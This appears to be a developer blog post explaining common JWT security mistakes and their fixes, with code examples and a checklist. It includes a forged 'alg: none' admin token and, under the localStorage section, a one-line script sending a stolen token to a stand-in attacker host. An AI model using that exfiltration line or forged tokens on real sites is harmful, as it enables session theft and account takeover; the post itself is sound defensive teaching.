---
title: "🔐 JWT Security: You're Probably Doing It Wrong (And That's Okay)"
date: "2026-05-07"
excerpt: "JWTs are everywhere, and so are the mistakes. From the infamous 'alg: none' trick to storing tokens in localStorage like it's 2013 — let's fix the most common JWT security blunders before they fix you."
tags: ["security", "jwt", "authentication", "cybersecurity", "api", "web-security"]
featured: true
---

# 🔐 JWT Security: You're Probably Doing It Wrong (And That's Okay)

JSON Web Tokens. The little base64-encoded strings that power half the internet's authentication and cause the other half's security incidents.

JWTs are elegant in theory: a self-contained, signed token that proves who you are without a round-trip to the database. In practice, they're a loaded footgun handed to developers with a sticky note that says "just sign it and you're good." Spoiler: you are not good.

Let's walk through the most dangerous JWT mistakes in the wild — with the fixes baked in — so you can build auth that doesn't make a security researcher's eyes light up.

## The Anatomy of a JWT (30-Second Version)

A JWT has three parts separated by dots: `header.payload.signature`.

- **Header**: algorithm used to sign the token (e.g., `HS256`)
- **Payload**: the claims — user ID, roles, expiry, etc.
- **Signature**: proof that the header and payload haven't been tampered with

The key word there is *signature*. A JWT is **not encrypted** by default. Anyone can base64-decode the payload and read it. They just can't *modify* it without invalidating the signature. Keep that distinction tattooed on your brain.

## Mistake #1: Trusting the `alg: none` Attack

This one is legendary. Some JWT libraries, when configured naively, accept a token where the header says `"alg": "none"` — meaning "no signature required." An attacker can craft any payload they want, strip the signature, set the algorithm to `none`, and walk right through your auth check.

Here's what a malicious token looks like after base64 decoding:

```json
// Header
{ "alg": "none", "typ": "JWT" }

// Payload (attacker crafted this)
{ "sub": "1", "role": "admin", "exp": 9999999999 }

// Signature: (empty string — nothing to verify)
```

The fix is dead simple: **always explicitly specify which algorithms you accept**, and never include `none`:

```javascript
import jwt from 'jsonwebtoken';

// ❌ Dangerous — accepts whatever algorithm the token claims
const payload = jwt.verify(token, secret);

// ✅ Safe — only HS256 accepted, full stop
const payload = jwt.verify(token, secret, { algorithms: ['HS256'] });
```

If your library doesn't let you restrict algorithms, find a better library. This isn't optional.

## Mistake #2: Storing Tokens in `localStorage`

Here's a conversation that happens more than it should:

> "Where do I store the JWT on the client?"
> "localStorage, it's easy!"
> *(XSS attack happens three weeks later)*
> "...oh."

`localStorage` is accessible to any JavaScript running on your page. Any JavaScript. Including the JavaScript injected via a third-party widget, a compromised npm package, or a stored XSS vulnerability you haven't found yet. An attacker who achieves XSS on your site can steal every token in `localStorage` in one line:

```javascript
// Attacker's one-liner to harvest tokens
fetch('https://evil.example/steal?t=' + localStorage.getItem('jwt'));
```

**The right answer is `HttpOnly` cookies.** They're inaccessible to JavaScript entirely — XSS can't read them:

```javascript
// Server sets the cookie after login
res.cookie('token', jwt, {
  httpOnly: true,   // JS can't touch this
  secure: true,     // HTTPS only
  sameSite: 'strict', // blocks CSRF cross-origin sends
  maxAge: 60 * 60 * 1000, // 1 hour
});
```

Yes, this means you need to handle CSRF differently. `sameSite: 'strict'` covers the vast majority of cases. For APIs consumed by mobile clients that can't use cookies, use short-lived tokens and refresh token rotation — but that's a whole other post.

## Mistake #3: Tokens That Never Die

A JWT without an expiry is an immortal credential. Lose your laptop? Your sessions live forever. Employee quits angry? Their admin token still works next year. Token gets stolen somehow? Good luck revoking it — there's nothing to revoke.

Always set `exp`:

```javascript
const token = jwt.sign(
  {
    sub: user.id,
    role: user.role,
    iat: Math.floor(Date.now() / 1000),
  },
  process.env.JWT_SECRET,
  { expiresIn: '15m' } // short-lived access token
);
```

Fifteen minutes is a common access token lifetime. Pair it with a refresh token (stored in an `HttpOnly` cookie, longer-lived, single-use, rotated on each use) and you get a good balance of security and usability.

And yes — always **verify** the expiry on every request:

```javascript
try {
  const payload = jwt.verify(token, process.env.JWT_SECRET, {
    algorithms: ['HS256'],
  });
  // payload.exp was checked automatically — expired tokens throw
} catch (err) {
  if (err.name === 'TokenExpiredError') {
    return res.status(401).json({ error: 'Token expired. Please refresh.' });
  }
  return res.status(401).json({ error: 'Invalid token.' });
}
```

## Mistake #4: Weak Secrets

`HS256` is a symmetric algorithm — your server signs and verifies with the same secret. If the secret is weak, an attacker can brute-force it offline after capturing a token. There are public tools that crack short JWT secrets in seconds.

Rules for a proper JWT secret:
- **At least 256 bits (32 bytes)** of random data — not a password, not a word, not `"secret123"`
- Generated with a cryptographically secure random number generator
- Stored in environment variables, never committed to source control

```bash
# Generate a proper secret
node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"
```

If you're on a distributed system or want to eliminate the shared-secret problem entirely, consider switching to `RS256` (asymmetric): sign with a private key, verify with a public key. Compromise of the verification side doesn't compromise token issuance.

## The Checklist

Before you ship auth, run through this:

- [ ] Algorithm explicitly whitelisted (`HS256` or `RS256`, never `none`)
- [ ] Tokens stored in `HttpOnly`, `Secure`, `SameSite=Strict` cookies
- [ ] Short expiry on access tokens (15–60 minutes max)
- [ ] JWT secret is 256+ bits of random entropy, stored in env vars
- [ ] Expired and invalid tokens return `401`, not `500`
- [ ] Token payload contains no sensitive data (passwords, PII, secrets)

## The Takeaway

JWTs aren't insecure — they're just easy to implement insecurely. The mistakes above are all fixable in an afternoon, and each one closes a real attack vector that security researchers find in production systems every single week.

Get the algorithm pinning right. Move tokens out of `localStorage`. Set an expiry. Use a strong secret. That's 80% of JWT security right there.

The other 20%? That's what keeps security engineers employed. 😄

---

**Seen any JWT horror stories in the wild?** I'd love to hear them — find me on [GitHub](https://github.com/kpanuragh) or drop a comment below. And if your team is skipping the `algorithms` option right now, maybe don't wait to fix that one.
